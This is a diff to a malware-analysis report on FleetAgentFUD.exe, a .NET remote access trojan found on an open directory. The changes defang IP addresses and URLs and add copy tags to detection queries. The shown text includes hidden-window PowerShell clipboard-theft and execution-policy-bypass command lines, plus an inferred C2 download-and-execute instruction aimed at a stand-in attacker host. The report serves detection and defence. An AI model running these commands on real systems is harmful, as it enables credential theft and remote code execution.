@@ -20,9 +20,9 @@ permalink: /reports/fleetagentfud-exe/
 hide: true
 ---
 
-> **Open Directory Investigation**: This sample was discovered on an open directory hosted at IP address **109.230.231.37**, representing an active malware distribution point. The presence of multiple RAT variants and trojans on this infrastructure suggests organized malware distribution operations targeting opportunistic victims. FleetAgentFUD.exe is the fifth sample analyzed from this source, exhibiting distinctly different operational characteristics compared to the persistence-focused FleetAgentAdvanced.exe. To see all other reports from this investigation see [Executive Overview](/reports/109.230.231.37-Executive-Overview/)
+> **Open Directory Investigation**: This sample was discovered on an open directory hosted at IP address **109[.]230[.]231[.]37**, representing an active malware distribution point. The presence of multiple RAT variants and trojans on this infrastructure suggests organized malware distribution operations targeting opportunistic victims. FleetAgentFUD.exe is the fifth sample analyzed from this source, exhibiting distinctly different operational characteristics compared to the persistence-focused FleetAgentAdvanced.exe. To see all other reports from this investigation see [Executive Overview](/reports/109.230.231.37-Executive-Overview/)
 
-**Campaign Identifier:** Arsenal-237-109.230.231.37-Malware-Repository
+**Campaign Identifier:** Arsenal-237-109[.]230[.]231[.]37-Malware-Repository
 
 ---
 
@@ -87,12 +87,12 @@ Critical capabilities include encrypted WebSocket C2 communications with custom 
 
 ### Recommended Actions
 1. **ISOLATE** systems showing suspicious processes with WebSocket connections or hidden PowerShell execution
-2. **BLOCK** distribution infrastructure: IP 109.230.231.37 at network perimeter (firewall, IPS/IDS)
+2. **BLOCK** distribution infrastructure: IP 109[.]230[.]231[.]37 at network perimeter (firewall, IPS/IDS)
 3. **DEPLOY** WebSocket traffic inspection and behavioral detection rules for FUD malware patterns
 4. **HUNT** enterprise-wide for file hash (SHA256: 072ce701ec0252eeddd6a0501555296bce512a7b90422addbb6d3619ae10f4ff)
 5. **MONITOR** network for WebSocket upgrade patterns and encrypted C2 traffic from untrusted executables
 6. **ROTATE** credentials for all users on confirmed or suspected infected systems (assume clipboard compromise)
-7. **INVESTIGATE** network logs for connections to 109.230.231.37 to identify patient zero and infection vector
+7. **INVESTIGATE** network logs for connections to 109[.]230[.]231[.]37 to identify patient zero and infection vector
 
 ---
 
@@ -115,10 +115,10 @@ Critical capabilities include encrypted WebSocket C2 communications with custom 
 - **Type**: PE32 executable (GUI) Intel 80386, .NET compiled
 - **Compilation**: Microsoft Visual C# .NET, CLR v4.0.30319
 - **Malware Type**: Remote Access Trojan (RAT) with FUD Evasion
-- **Distribution Source**: IP 109.230.231.37 (CONFIRMED)
+- **Distribution Source**: IP 109[.]230[.]231[.]37 (CONFIRMED)
 - **Agent Version**: 3.0.0 (embedded version string)
 
-This sample was found on an open directory at 109.230.231.37 alongside other malware families, among them PoetRAT, NjRAT and XWorm variants, and FleetAgentAdvanced.exe. The directory is an active distribution point serving several threat families to opportunistic victims, and FleetAgentFUD.exe is the fifth distinct sample analyzed from it.
+This sample was found on an open directory at 109[.]230[.]231[.]37 alongside other malware families, among them PoetRAT, NjRAT and XWorm variants, and FleetAgentAdvanced.exe. The directory is an active distribution point serving several threat families to opportunistic victims, and FleetAgentFUD.exe is the fifth distinct sample analyzed from it.
 
 **File Characteristics:**
 - **Entropy**: 5.2171 (moderate - indicates some compression/encoding but not heavily packed)
@@ -315,6 +315,7 @@ PowerShell Logging (ESSENTIAL):
 - EventID 4688: Process creation - powershell.exe with bypass arguments
 - Sysmon EventID 1: Process creation with CommandLine containing bypass parameters
 ```
+{: .hl-copy}
 
 The [Detection Package]({{ "/hunting-detections/fleetagentfud-exe/" | relative_url }}) carries the Splunk and SIEM queries.
 
@@ -339,7 +340,7 @@ PowerShell Command:
 
 Attack Flow:
 1. C2 sends clipboard monitoring command (periodic polling every 5-10 seconds)
-2. FleetAgentFUD.exe executes: powershell.exe -NoP -W Hidden -C Get-Clipboard
+2. FleetAgentFUD.exe executes: [p]owershell.exe -NoP -W Hidden -C Get-Clipboard
 3. PowerShell retrieves clipboard contents (text, file paths, images)
 4. Data exfiltrated to C2 via WebSocket in real-time
 ```
@@ -377,6 +378,7 @@ index=windows EventID=4104 ScriptBlockText="Get-Clipboard"
 | stats count by ComputerName, User
 | where count > 10
 ```
+{: .hl-copy}
 
 **Mitigation:**
 - Password manager autofill (bypasses clipboard entirely)
@@ -400,7 +402,7 @@ Command Structure (Inferred):
 {
   "cmd_type": "download",
   "command": {
-    "url": "http://attacker.com/payload.exe",
+    "url": "hxxp://attacker[.]com/payload.exe",
     "destination": "C:\\Users\\Public\\payload.exe",
     "execute": true
   }
@@ -766,7 +768,7 @@ PowerShell execution is CONFIRMED.
 **Implementation:**
 ```
 PowerShell Invocation:
-powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "[COMMAND]"
+[p]owershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "[COMMAND]"
 
 Capabilities:
 - Arbitrary PowerShell execution from C2
@@ -825,6 +827,7 @@ index=windows EventID=4104 ScriptBlockText="Get-Clipboard"
 | stats count by ComputerName
 | where count > 10
 ```
+{: .hl-copy}
 
 **Mitigation:**
 - Password manager autofill (bypasses clipboard)
@@ -942,7 +945,7 @@ Get-ExecutionPolicy → "Restricted"
 .\script.ps1 → ERROR: Script execution blocked
 
 Bypassed State:
-powershell.exe -ExecutionPolicy Bypass -File script.ps1
+[p]owershell.exe -ExecutionPolicy Bypass -File script.ps1
 → Executes without restriction
 ```
 
@@ -1064,11 +1067,12 @@ foreach ($path in $searchPaths) {
     }
 }
 ```
+{: .hl-copy}
 
 **Behavioral Detection:**
 - PowerShell Execution Policy bypass in logs (EventID 4104 with "-Exec*Bypass*")
 - WebSocket connections from .NET executables in AppData
-- Outbound connections to 109.230.231.37 (distribution infrastructure)
+- Outbound connections to 109[.]230[.]231[.]37 (distribution infrastructure)
 - Repeated small data transfers (heartbeat pattern) from untrusted executables
 
 **Network Detection:**
@@ -1214,7 +1218,7 @@ Type:      PE32 executable (GUI) Intel 80386, .NET compiled
 
 **Distribution Infrastructure:**
 ```
-IP Address:     109.230.231.37
+IP Address:     109[.]230[.]231[.]37
 Service:        Open directory serving multiple malware families
 Status:         ACTIVE (as of 2026-01-12)
 Confidence:     CONFIRMED
